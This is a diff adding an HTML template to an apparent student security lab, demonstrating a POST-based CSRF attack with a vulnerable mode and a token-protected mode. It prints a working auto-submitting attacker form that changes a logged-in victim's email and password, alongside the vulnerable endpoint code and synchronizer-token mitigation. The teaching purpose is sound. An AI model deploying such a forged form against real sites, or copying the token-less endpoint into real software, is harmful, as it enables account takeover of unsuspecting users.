@@ -1,0 +1,205 @@
+{% extends "base.html" %}
+
+{% block title %}Sarvansh - CSRF (POST-Based Forged Action) | SecureLab{% endblock %}
+
+{% block content %}
+<div class="row mb-3">
+  <div class="col-12">
+    <div class="card" style="border-color: #8957e5;">
+      <div class="card-header bg-black text-white d-flex justify-content-between align-items-center flex-wrap">
+        <div>
+          <span class="badge text-light fs-6 me-2" style="background-color: #8957e5;">Sarvansh's Assignment</span>
+          <strong class="text-white fs-5">Category: CSRF &bull; Variant 2: POST-Based Forged Action (Auto-Submitting Form)</strong>
+        </div>
+        <div>
+          {% if current_mode == 'vulnerable' %}
+            <span class="badge badge-vulnerable p-2"><i class="bi bi-unlock-fill me-1"></i> Vulnerable Implementation Active (No CSRF Token)</span>
+          {% else %}
+            <span class="badge badge-secure p-2"><i class="bi bi-shield-lock-fill me-1"></i> Synchronizer Token Pattern Active</span>
+          {% endif %}
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="row g-4">
+  <!-- Left Column: User Profile & Security Settings -->
+  <div class="col-lg-6">
+    <div class="card h-100">
+      <div class="card-header bg-black text-white d-flex justify-content-between align-items-center">
+        <h5 class="mb-0"><i class="bi bi-person-badge text-primary me-2"></i>Victim User Account Settings</h5>
+        <small class="text-secondary">Target Endpoint: <code>POST /csrf-post/update</code></small>
+      </div>
+      <div class="card-body">
+
+        <!-- Mode Notification -->
+        {% if current_mode == 'vulnerable' %}
+          <div class="alert alert-danger py-2 small d-flex align-items-center">
+            <i class="bi bi-exclamation-triangle-fill fs-5 me-2"></i>
+            <div><strong>VULNERABLE STATE:</strong> Missing Anti-CSRF token verification and SameSite cookie protection! Cross-site POSTs succeed.</div>
+          </div>
+        {% else %}
+          <div class="alert alert-success py-2 small d-flex align-items-center">
+            <i class="bi bi-shield-fill-check fs-5 me-2"></i>
+            <div><strong>SECURE STATE:</strong> Synchronizer Token Pattern active. External cross-origin POST requests are blocked with HTTP 403!</div>
+          </div>
+        {% endif %}
+
+        <!-- CSRF Blocked Alert -->
+        {% if csrf_blocked %}
+          <div class="alert alert-success d-flex align-items-center" role="alert">
+            <i class="bi bi-shield-check fs-3 me-3 text-success"></i>
+            <div>
+              <h5 class="alert-heading mb-1 text-success">DEFENSE ACTIVE: Forged CSRF Request Blocked (HTTP 403)</h5>
+              <p class="mb-0 small">The incoming POST request from origin <code>{{ origin_header }}</code> lacked a valid Synchronizer Anti-CSRF Token. The state change was rejected!</p>
+            </div>
+          </div>
+        {% endif %}
+
+        <!-- Current User Account Details -->
+        <div class="p-3 mb-4 bg-dark rounded border border-secondary">
+          <h6 class="text-secondary small text-uppercase mb-2">Authenticated Victim Session:</h6>
+          <div class="row">
+            <div class="col-sm-4 text-secondary">Logged-in User:</div>
+            <div class="col-sm-8"><strong class="text-white">{{ user.username }}</strong></div>
+          </div>
+          <div class="row mt-1">
+            <div class="col-sm-4 text-secondary">Current Email:</div>
+            <div class="col-sm-8">
+              {% if 'attacker' in user.email or 'hacker' in user.email %}
+                <span class="badge bg-danger p-2 fs-6">{{ user.email }} (COMPROMISED VIA CSRF!)</span>
+              {% else %}
+                <span class="text-info fw-bold">{{ user.email }}</span>
+              {% endif %}
+            </div>
+          </div>
+          <div class="row mt-1">
+            <div class="col-sm-4 text-secondary">Account Balance:</div>
+            <div class="col-sm-8 text-success fw-bold">${{ "%.2f"|format(user.balance) }}</div>
+          </div>
+        </div>
+
+        <!-- Legitimate Form on Current Origin -->
+        <h6 class="text-white"><i class="bi bi-pencil-square me-1 text-primary"></i>Update Profile Details:</h6>
+        <form action="{{ url_for('csrf_update_email') }}" method="POST">
+          <!-- In secure mode, the anti-CSRF token is included -->
+          {% if current_mode == 'secure' %}
+            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+          {% endif %}
+
+          <div class="mb-3">
+            <label class="form-label text-light">New Email Address</label>
+            <input type="email" name="email" class="form-control bg-dark border-secondary text-light" value="{{ user.email }}" required>
+          </div>
+
+          <div class="mb-3">
+            <label class="form-label text-light">Change Password</label>
+            <input type="password" name="new_password" class="form-control bg-dark border-secondary text-light" placeholder="Leave blank to keep unchanged">
+          </div>
+
+          {% if current_mode == 'secure' %}
+            <div class="mb-3">
+              <span class="badge bg-success"><i class="bi bi-key-fill me-1"></i> Anti-CSRF Token Embedded:</span>
+              <div class="code-box text-success py-1 mt-1 small">{{ csrf_token }}</div>
+            </div>
+          {% endif %}
+
+          <button type="submit" class="btn btn-primary w-100 fw-bold">
+            <i class="bi bi-check2-circle me-1"></i> Save Changes (Legitimate Same-Origin)
+          </button>
+        </form>
+
+        <!-- Attacker Launch Card -->
+        <div class="mt-4 p-3 rounded border border-warning bg-black">
+          <h6 class="text-warning mb-1"><i class="bi bi-radioactive me-1"></i>Simulate CSRF Attack:</h6>
+          <p class="small text-secondary mb-2">
+            Open the simulated attacker's page in a separate tab or click the button below. The attacker's page will automatically execute a cross-origin POST request with an auto-submitting form!
+          </p>
+          <a href="{{ url_for('attacker_site') }}" target="_blank" class="btn btn-outline-warning btn-sm w-100 fw-bold">
+            <i class="bi bi-box-arrow-up-right me-1"></i> Launch Attacker Site (Auto-Submitting Form)
+          </a>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- Right Column: Academic Report (Table 2) -->
+  <div class="col-lg-6">
+    <div class="card h-100">
+      <div class="card-header bg-black text-white">
+        <h5 class="mb-0"><i class="bi bi-file-earmark-text text-info me-2"></i>Viva &amp; Demonstration Guide (Table 2)</h5>
+      </div>
+      <div class="card-body">
+
+        <!-- (a) Vulnerable Implementation -->
+        <div class="mb-3">
+          <h6 class="text-danger fw-bold"><i class="bi bi-bug me-1"></i>(a) Vulnerable Implementation</h6>
+          <p class="small text-secondary mb-1">Located in <code>app.py</code> within function <code>csrf_update_email()</code>:</p>
+          <div class="code-box small">
+# Endpoint processes state-changing POST relying solely on session cookie
+new_email = request.form.get("email")
+cursor.execute("UPDATE users SET email = ? WHERE username = ?", (new_email, username))
+conn.commit()
+          </div>
+        </div>
+
+        <!-- (b) Working Exploit -->
+        <div class="mb-3">
+          <h6 class="text-warning fw-bold"><i class="bi bi-terminal me-1"></i>(b) Working Exploit Payload (Attacker Page)</h6>
+          <p class="small text-secondary mb-1">External hostile webpage (<code>templates/attacker/csrf_exploit.html</code>):</p>
+          <div class="code-box text-light small">
+&lt;form action="http://localhost:5000/csrf-post/update" method="POST" id="csrfForm"&gt;
+  &lt;input type="hidden" name="email" value="attacker_sarvansh@hacker.io"&gt;
+  &lt;input type="hidden" name="new_password" value="hackedPassword2026!"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  // Automatically submits as soon as victim opens the page!
+  document.getElementById('csrfForm').submit();
+&lt;/script&gt;
+          </div>
+          <p class="small text-secondary mt-1">
+            <strong>How it works:</strong> The browser automatically attaches the victim's session cookie when making the cross-origin POST request. Without a CSRF token, the server cannot tell if the request was initiated intentionally by the user or forged by the attacker's script.
+          </p>
+        </div>
+
+        <!-- (c) Root Cause -->
+        <div class="mb-3">
+          <h6 class="text-primary fw-bold"><i class="bi bi-info-circle me-1"></i>(c) Root Cause</h6>
+          <p class="small text-light mb-0 bg-dark p-2 rounded border border-secondary">
+            <strong>State-changing request accepted without proof of user intent:</strong> Web browsers inherently include ambient authentication credentials (cookies) with cross-site requests. Without an anti-CSRF token or SameSite cookie restrictions, the server mistakes a forged cross-site request for a legitimate user action.
+          </p>
+        </div>
+
+        <!-- (d) Mitigation Implemented -->
+        <div class="mb-3">
+          <h6 class="text-success fw-bold"><i class="bi bi-shield-check me-1"></i>(d) Mitigation Implemented</h6>
+          <p class="small text-secondary mb-1">
+            <strong>Synchronizer Token Pattern:</strong> The server generates a cryptographically random, unpredictable token per session. Form submissions must return this token. The attacker cannot read the token due to the Same-Origin Policy (SOP).
+          </p>
+          <div class="code-box small text-success">
+session_token = session.get("csrf_token")
+submitted_token = request.form.get("csrf_token")
+
+if not submitted_token or not secrets.compare_digest(submitted_token, session_token):
+    return "CSRF Attack Blocked: Invalid Token", 403
+          </div>
+        </div>
+
+        <!-- (e) Other Mitigations (Theory) -->
+        <div class="mb-2">
+          <h6 class="text-info fw-bold"><i class="bi bi-journal-bookmark me-1"></i>(e) Other Mitigations from Lecture (Theory)</h6>
+          <ul class="small text-secondary ps-3 mb-0">
+            <li><strong>SameSite Cookie Attribute:</strong> Setting <code>SameSite=Strict</code> or <code>SameSite=Lax</code> instructs browsers not to send session cookies on cross-site requests.</li>
+            <li><strong>Re-authentication for sensitive actions:</strong> Requiring the user to enter their current password or 2FA OTP before executing critical state modifications (email, password, or balance changes).</li>
+            <li><strong>Avoiding state-changing GET requests:</strong> Ensuring GET methods are strictly idempotent and safe, preventing trivial image/link tag exploitation.</li>
+            <li><strong>Custom Request Headers:</strong> Verifying custom headers (e.g. <code>X-Requested-With</code>) in AJAX requests combined with CORS controls.</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
